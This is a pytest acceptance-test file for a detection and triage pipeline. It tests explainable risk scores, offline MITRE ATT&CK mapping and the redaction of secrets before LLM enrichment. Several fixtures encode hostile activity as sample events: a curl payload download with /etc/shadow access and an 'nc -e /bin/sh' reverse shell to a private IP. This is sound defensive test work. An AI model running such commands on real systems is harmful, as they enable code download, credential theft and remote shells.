#!/usr/bin/env python3
"""
Person 3 acceptance tests — Detection Explainability & Offline Guarantees.

Covers:
  1. Triage output carries basis / score-type / risk-score / evidence
     (explainability contract in docs/EVENT_CONTRACT.md §3.1).
  2. No probability-style wording ("94% True Positive") in deliverables.
  3. Deterministic offline MITRE ATT&CK mapping (no Pinecone/Gemini needed).
  4. orchestrator.analyze_alert() works fully offline and records provenance.
  5. LLM prompt sanitization strips secrets before external enrichment.

Run with:
    pytest tests/test_person3_explainability.py -v
"""

import json
import os
import sys
from pathlib import Path

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from forwarder.ml_triage import MLTriage


@pytest.fixture(scope="module")
def triage():
    """MLTriage in deterministic heuristic mode (no model file)."""
    return MLTriage(Path("__missing_model__.bin"), Path("__missing_features__.json"))


def _tp_event():
    return {
        "event_type": "process_exec",
        "syscall": "execve",
        "telemetry": {
            "binary": "/usr/bin/curl",
            "args": ["-s", "http://10.0.0.5/payload.sh"],
            "uid": 0,
            "pid": 4242,
            "file_path": "/etc/shadow",
        },
    }


def _fp_event():
    return {
        "event_type": "process_exec",
        "syscall": "read",
        "telemetry": {
            "binary": "/usr/bin/cat",
            "args": ["/var/log/app.log"],
            "uid": 1000,
            "pid": 100,
        },
    }


# ── 1. Triage explainability contract ───────────────────────────────


class TestTriageExplainability:
    def test_tp_result_carries_full_provenance(self, triage):
        result = triage.triage_event(_tp_event())
        t = result["triage"]

        assert t["grade"] == "TP"
        assert t["basis"] == "heuristic_rules"
        assert t["score_type"] == "risk_score"
        assert isinstance(t["risk_score"], int) and t["risk_score"] >= 5
        assert isinstance(t["evidence"], list) and len(t["evidence"]) > 0

    def test_fp_result_is_low_risk(self, triage):
        result = triage.triage_event(_fp_event())
        t = result["triage"]

        assert t["grade"] == "FP"
        assert t["risk_score"] < 3
        assert t["basis"] == "heuristic_rules"

    def test_explanation_documents_confidence_semantics(self, triage):
        result = triage.triage_event(_tp_event())
        explanation = result["explanation"]

        assert "not a calibrated probability" in explanation["confidence_semantics"]
        assert explanation["recommended_action"]
        assert "risk_score" in explanation["guidance"]

    def test_deliverable_avoids_probability_claims(self, triage):
        """Confidence must never be phrased as a probability of malice."""
        deliverable = triage.triage_event(_tp_event())["deliverable"]

        assert "True Positive" in deliverable
        assert "% True Positive" not in deliverable
        assert "chance" not in deliverable.lower()
        assert "probability" not in deliverable.lower()

    def test_evidence_is_human_readable(self, triage):
        evidence = triage.triage_event(_tp_event())["triage"]["evidence"]
        joined = " ".join(evidence)

        # The TP event hits: root, high-risk binary, network args, sensitive path
        assert "uid 0" in joined
        assert "risk" in joined.lower()


# ── 2. Offline MITRE mapping ────────────────────────────────────────


class TestOfflineMitreMapping:
    def test_shadow_access_maps_to_credential_dumping(self):
        from orchestrator import map_mitre_offline

        techniques = map_mitre_offline({
            "process": "cat",
            "syscall": "openat",
            "file_path": "/etc/shadow",
            "event_type": "process_exec",
        })
        ids = [t["id"] for t in techniques]
        assert "T1003.008" in ids

    def test_curl_connect_maps_to_ingress_tool_and_c2(self):
        from orchestrator import map_mitre_offline

        techniques = map_mitre_offline({
            "process": "curl",
            "syscall": "connect",
            "file_path": "http://10.0.0.5/x",
            "event_type": "process_exec",
        })
        ids = [t["id"] for t in techniques]
        assert "T1105" in ids
        assert "T1071.001" in ids

    def test_reverse_shell_indicators_map_to_non_app_layer_protocol(self):
        from orchestrator import map_mitre_offline

        techniques = map_mitre_offline({
            "process": "nc",
            "syscall": "execve",
            "args": ["-e", "/bin/sh", "10.0.0.5", "4444"],
            "event_type": "process_exec",
        })
        ids = [t["id"] for t in techniques]
        assert "T1095" in ids

    def test_every_technique_has_reference_url(self):
        from orchestrator import map_mitre_offline

        for technique in map_mitre_offline({"process": "nmap", "event_type": "process_exec"}):
            assert technique["url"].startswith("https://attack.mitre.org/techniques/")
            assert technique["name"] != "Unknown Technique"


# ── 3. Offline orchestrator pipeline ────────────────────────────────


class TestOrchestratorOffline:
    def _force_offline(self, monkeypatch):
        import orchestrator

        monkeypatch.setattr(orchestrator, "_llm", None)
        monkeypatch.setattr(orchestrator, "_pc_index", None)
        monkeypatch.setattr(orchestrator, "_genai_client", None)
        monkeypatch.setattr(orchestrator, "_embeddings_model", None)
        return orchestrator

    def test_analyze_alert_records_offline_provenance(self, monkeypatch):
        orchestrator = self._force_offline(monkeypatch)

        event = {
            "process": "curl",
            "syscall": "connect",
            "file_path": "http://10.0.0.5/x",
            "pod_name": "test-pod",
            "namespace": "default",
            "timestamp": "2026-01-01T00:00:00Z",
            "event_type": "process_exec",
        }
        result = orchestrator.analyze_alert(event, 0.91, "TP")

        assert result["provenance"]["external_enrichment"] is False
        assert result["provenance"]["mitre_mapping"] == "offline_rules"
        assert result["provenance"]["report_source"] == "offline_template"
        assert result["mitre_techniques"], "offline mapping must produce techniques"
        assert result["final_report"]
        assert result["yaml_fix"]

    def test_fp_event_is_auto_suppressed(self, monkeypatch):
        orchestrator = self._force_offline(monkeypatch)

        result = orchestrator.analyze_alert(
            {"process": "cat", "syscall": "read", "event_type": "process_exec"},
            0.9,
            "FP",
        )

        assert result["final_report"].startswith("Auto-suppressed")
        assert result["provenance"]["report_source"] == "auto_suppressed"
        assert result["yaml_fix"] == ""

    def test_analysis_is_deterministic(self, monkeypatch):
        orchestrator = self._force_offline(monkeypatch)

        event = {
            "process": "wget",
            "syscall": "execve",
            "file_path": "/tmp/x",
            "event_type": "process_exec",
        }
        first = orchestrator.analyze_alert(dict(event), 0.9, "TP")
        second = orchestrator.analyze_alert(dict(event), 0.9, "TP")

        assert first["final_report"] == second["final_report"]
        assert [t["id"] for t in first["mitre_techniques"]] == [
            t["id"] for t in second["mitre_techniques"]
        ]


# ── 4. LLM prompt sanitization ──────────────────────────────────────


class TestPromptSanitization:
    def test_secrets_are_redacted_before_llm(self):
        from orchestrator import sanitize_event_for_llm

        sanitized = sanitize_event_for_llm({
            "process": "curl",
            "file_path": "/srv/app",
            "args": ["--token=supersecret123", "-H", "Authorization: Bearer abcdefghijklmnopqrst"],
            "alert_title": "Bearer zzzzzzzzzzzzzzzzzzz",
        })
        dumped = json.dumps(sanitized)

        assert "supersecret123" not in dumped
        assert "abcdefghijklmnopqrst" not in dumped
        assert "zzzzzzzzzzzzzzzzzzz" not in dumped
        assert "REDACTED" in dumped or "[REDACTED_SECRET]" in dumped

    def test_clean_event_passes_through_unchanged(self):
        from orchestrator import sanitize_event_for_llm

        clean = {"process": "cat", "file_path": "/var/log/app.log"}
        assert sanitize_event_for_llm(clean) == clean
